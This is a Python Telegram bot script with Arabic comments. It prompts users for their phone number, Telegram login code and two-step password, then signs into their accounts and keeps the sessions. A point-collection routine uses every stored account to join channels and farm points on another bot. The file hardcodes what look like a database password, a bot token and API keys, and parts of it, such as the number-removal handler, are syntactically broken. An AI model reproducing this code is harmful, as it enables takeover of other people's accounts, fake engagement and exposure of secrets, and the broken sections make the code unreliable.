from telethon import TelegramClient, events, Button, errors
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
import asyncio, json, os, re
from sqlalchemy import create_engine, Column, Integer, String, MetaData
from sqlalchemy.orm import sessionmaker
from sqlalchemy.ext.declarative import declarative_base

# تكوين اتصال قاعدة البيانات (استخدم معلومات الاتصال الخاصة بك)
db_url = "mysql://root:mTor5MxStNrF2lBm64EH@containers-us-west-157.railway.app:6763/railway"  # استبدل هذا بمعلومات الاتصال الخاصة بك

engine = create_engine(db_url)

# تعريف جلسات SQLAlchemy
Session = sessionmaker(bind=engine)
session = Session()

# إنشاء قاعدة الجدول
Base = declarative_base()

class SessionTable(Base):
    __tablename__ = 'sessions'

    id = Column(Integer, primary_key=True)
    phone = Column(String)
    api_id = Column(Integer)
    api_hash = Column(String)

# إنشاء الجدول إذا لم يكن موجودًا بالفعل
Base.metadata.create_all(engine)

# الآن لديك اتصالًا بقاعدة البيانات وجاهز لاستخدامه داخل ملف تشغيل البوت الخاص بك.


# bot session
token = "6109895485:AAE43imQ2y0W_yDx5B_Fsdod_SWt7MyrKQg" 
api_id_bot = 25230422
api_hash_bot = "ade18a444a3ca95930a9e5a6a6d8ecb5"
bot = TelegramClient("Bot", api_id_bot, api_hash_bot).start(bot_token=token)

# needs
owner_id = [6699312679]
collect, bots_to_collect, start_earn = True, [], False

class User(Base):
    __tablename__ = 'users'

    id = Column(Integer, primary_key=True)
    username = Column(String)
    email = Column(String)
    # يمكنك تعريف المزيد من الأعمدة حسب احتياجاتك

        
#user info
api_id = 25230422
api_hash = "ade18a444a3ca95930a9e5a6a6d8ecb5"
# ADD NEW NUMBER
async def Add_NUMBER(event, api_id, api_hash, phone_number):      
    try:
        phone_number = phone_number.replace('+','').replace(' ', '')
        session_name = "AlragiBot_" + phone_number
        iqthon = TelegramClient(session_name, api_id, api_hash)
        await iqthon.connect()
        
        if not await iqthon.is_user_authorized():
            request = await iqthon.send_code_request(phone_number)
            
            async with bot.conversation(event.chat_id, timeout=300) as conv:
                # verification code
                verification_code_msg = await conv.send_message("__ارسل الكود الذي وصلك.. صع علامة ( - ) بين كل رقم:__")
                response_verification_code = await conv.get_response()
                verification_code = str(response_verification_code.message).replace('-', '')
                
                try:
                    login = await iqthon.sign_in(phone_number, code=int(verification_code))
                except errors.SessionPasswordNeededError:
                    password_msg = await conv.send_message("__الحساب محمي بكلمة السر, ارسل كلمة السر :__")
                    password = await conv.get_response()
                    
                    login = await iqthon.sign_in(phone_number, password=password.text)

                            # إضافة البيانات إلى قاعدة البيانات
            new_session = SessionTable(phone=phone_number, api_id=api_id, api_hash=api_hash)
            session.add(new_session)
            session.commit()

        return "تمت إضافة الرقم بنجاح"
    except Exception as error:
        return str(error)

# KEYBOARD
async def StartButtons(event, role):
    if role == 2:
        buttons = [[Button.inline("اضف رقم", "add_number")]]
    elif role == 1:
        buttons = [[Button.inline("اضف رقم", "add_number")], [Button.inline("حذف رقم", "remove_number")]]
    await event.reply("__لاضافة رقم اضغط على الزر اسفله لبدأ عملية اضافة الرقم__", buttons=buttons)


# BOT START
@bot.on(events.NewMessage(pattern='/start'))
async def BotOnStart(event):
    
    if event.chat_id in owner_id:
        await StartButtons(event, 1)
    else:
        await StartButtons(event, 2)

# DELETE NUMBER TELEGRAM BOT 
@bot.on(events.CallbackQuery(data="back_to_menu"))
async def Callbacks__(event):

    if event.chat_id in owner_id:
        await StartButtons(event, 1)
    else:
        await StartButtons(event, 2)

# DELETE NUMBER TELEGRAM BOT 
@bot.on(events.CallbackQuery(data="remove_number"))
async def Callbacks_(event):
    global sessions
    
    delete, sessions, in_session = await event.delete(), json.load(open("sessions/sessions.json")), False
    try:
        # تحديد الرقم من المستخدم
async with bot.conversation(event.chat_id, timeout=200) as conv:
    get_number = await conv.send_message("__ارسل الرقم لحذفه__")
    remove_number_message = await conv.get_response()
    remove_number = (remove_number_message.text).replace('+', '').replace(' ', '')

# البحث عن الجلسة التي تحتوي على الرقم وحذفها
session.query(Session).filter(Session.phone == remove_number).delete()

# تأكيد التغييرات (حفظ الحذف في قاعدة البيانات)
session.commit() 
    except Exception as error:
        print (error)
        
    if in_session == True:
        await event.reply("تم حذف الرقم بنجاح")
        sessions = json.load(open("sessions/sessions.json"))
    else:
        await event.reply("هذا الرقم غير موجود")
        
    if event.chat_id in owner_id:
        await StartButtons(event, 1)
    else:
        await StartButtons(event, 2)
        
# تعريف متغير لعدد الجلسات
session_count = len(sessions)  # حيث أن sessions هو قائمة تحتوي على الجلسات الحالية

@bot.on(events.NewMessage)
async def handle_message(event):
    if event.chat_id in owner_id:
        if ".عدد الحسابات" in event.text:
            await event.reply(f"عدد الحسابات الحالية هو: {session_count}")

# ADD NUMBER TELEGRAM BOT INFORMATION
@bot.on(events.CallbackQuery(data="add_number"))
async def Callbacks(event):
    
    await event.delete()    
    try:
        # get information from user
        async with bot.conversation(event.chat_id, timeout=300) as conv:
            
            await conv.send_message('__ارسل رقم الهاتف مع رمز الدولة:__')
            phone_number_msg = await conv.get_response()
            phone_number_msg = phone_number_msg.text

            await conv.send_message(f'''
**Api id :** `{api_id}`
**Api hash :** `{api_hash}`
**Phone number :** `{phone_number_msg}`

جاري تسجيل الدخول
''')

        result = await Add_NUMBER(event, int(api_id), api_hash, phone_number_msg)
        await event.reply(result)
    except Exception as error:
        pass
        
    if event.chat_id in owner_id:
        await StartButtons(event, 1)
    else:
        await StartButtons(event, 2)
    
    
#####################################################################################
# STOP COLLECT POINTS
@bot.on(events.NewMessage(pattern=r'.ايقاف الجمع'))
async def StopCollectPoints(event):
    global collect
    if event.chat_id in owner_id:
        collect = False
        stop_collect = await event.reply('**تم ايقاف الجمع**')

# START COLLECT POINTS
@bot.on(events.NewMessage(pattern=r'.بدء الجمع ?(.*)'))
async def StartCollectPoints(event):
    global start_earn
    
    if event.chat_id in owner_id:
        bot_username = (event.message.message).replace('.بدء الجمع', '').strip()
        start_collect, collect = await event.reply('**تم بدأ الجمع**'), True
        
        # collect
        if start_earn == False:
            start_earn = True
            task = asyncio.create_task(StartCollect(event, bot_username))
            await task
        
        order = await event.reply('**تم الجمع من جميع الحسابات**')


# JOIN PUBLIC
async def JoinChannel(client, username):
    try:
        Join = await client(JoinChannelRequest(channel=username))
        return [True, '']
    except errors.FloodWaitError as error:
        return [False, f'تم حظر هذا الحساب من الانضمام للقنوات لمدة : {error.seconds} ثانية']
    except errors.ChannelsTooMuchError:
        return [False, 'هذا الحساب وصل للحد الاقصى من القنوات التي يستطيع الانضمام لها']
    except errors.ChannelInvalidError:
        return [False, False]
    except errors.ChannelPrivateError:
        return [False, False]
    except errors.InviteRequestSentError:
        return [False, False]
    except Exception as error:
        return [False, f'{error}']
    

# JOIN PRIVATE
async def JoinChannelPrivate(client, username):
    try:
        Join = await client(ImportChatInviteRequest(hash=username))
        return [True, '']
    except errors.UserAlreadyParticipantError:
        return [True, '']
    except errors.UsersTooMuchError:
        return [False, False]
    except errors.ChannelsTooMuchError:
        return [False, 'هذا الحساب وصل للحد الاقصى من القنوات التي يستطيع الانضمام لها']
    except errors.InviteHashEmptyError:
        return [False, False]
    except errors.InviteHashExpiredError:
        return [False, False]
    except errors.InviteHashInvalidError:
        return [False, False]
    except errors.InviteRequestSentError:
        return [False, False]
    except Exception as error:
        return [False, f'{error}']
    

# COLLECT NOW
async def StartCollect(event, bot_username):
    
    # load sessions
    sessions = json.load(open("sessions/sessions.json"))
    while collect != False:
        for session in sessions:
            try:
                if collect == False:
                    # disconnect
                    try:
                        await client.disconnect()
                    except Exception as error:
                        pass
                    break
                
                api_id = int(sessions[session]["api_id"])
                api_hash = str(sessions[session]["api_hash"])
                phone = str(sessions[session]["phone"])
                
                client = TelegramClient("sessions/"+(phone), api_id, api_hash)
                
                await client.connect()
                user = await client.get_me()
                if user == None:
                    await bot.send_message(entity=owner_id[0] ,message=f"**الرقم :** {phone}\n\nهذا الرقم لا يعمل")
                else:
                    async with client.conversation(bot_username, timeout=20) as conv:
                        try:
                            while True:
                                start_msg1 = await conv.send_message("/start")
                                resp = await conv.get_response()
                                
                                # check for must join
                                if "عذراً" in resp.text or "عذراً" in resp.text:
                                    link_pattern = re.compile(r'(https?://\S+)')
                                    link = re.search(link_pattern, resp.message).group(1)
                                    
                                    print (link)
                                    if link.startswith('https://t.me/+') or link.startswith('https://t.me/joinchat/+'):
                                        link = link.replace('https://t.me/joinchat/+', '')
                                        link = link.replace('https://t.me/+', '')
                                        result = await JoinChannelPrivate(client, link.strip())
                                    else:
                                        get_entity_must_join = await client.get_entity(link)
                                        result = await JoinChannel(client, get_entity_must_join.id)
                                else:
                                    break
                            
                            click_collect = await resp.click(2)
                            resp2 = await conv.get_edit()
                            click_collect = await resp2.click(0)
                    
                            for x in range(6):
                                if collect == False:
                                    # disconnect
                                    try:
                                        await client.disconnect()
                                    except Exception as error:
                                        pass
                                    break
                                try:
                                    channel_details = await conv.get_edit()       
                                    
                                    # check points
                                    number_str = (channel_details.message).split('نقاطك الحاليه :')[1].strip()
                                    if int(number_str.strip()) >= 2000:
                                        await bot.send_message(entity=owner_id[0] ,message=f"**الرقم :** {phone}\n\n__لقد وصل هذا الحساب الى {number_str} نقطة__")
                                        break
                                                             
                                    channel_url = (channel_details.reply_markup.rows[0].buttons[0].url).replace('https://t.me/', '')
                                    if "+" in channel_url:
                                        channel_url = channel_url.replace('+', '')
                                        result = await JoinChannelPrivate(client, channel_url)
                                    else:
                                        result = await JoinChannel(client, channel_url)

                                    if result[0] == True:
                                        await channel_details.click(2)
                                    else:
                                        if result[1] == False:
                                            await channel_details.click(1)
                                        else:
                                            await bot.send_message(entity=owner_id[0] ,message=f"**الرقم :** {phone}\n\n__{result[1]}__")
                                            # disconnect
                                            try:
                                                await client.disconnect()
                                            except Exception as error:
                                                pass
                                            break
                                        
                                    await asyncio.sleep(3)
                                    
                                except Exception as error:
                                    await bot.send_message(entity=owner_id[0] ,message=f"**الرقم :** {phone}\n\n__{error}__")
                                    # disconnect
                                    try:
                                        await client.disconnect()
                                    except Exception as error:
                                        pass
                                    break
                    
                        except Exception as error:
                            if str(error) == "":
                                await bot.send_message(entity=owner_id[0] ,message=f"**الرقم :** {phone}\n\nالبوت لا يستجيب بسرعه. تم تخطي هذا الرقم")
                
                
                # disconnect
                try:
                    await client.disconnect()
                except Exception as error:
                    pass
                
                # load sessions again
                sessions = json.load(open("sessions/sessions.json"))
            except Exception as error:
                pass
        

bot.run_until_disconnected()
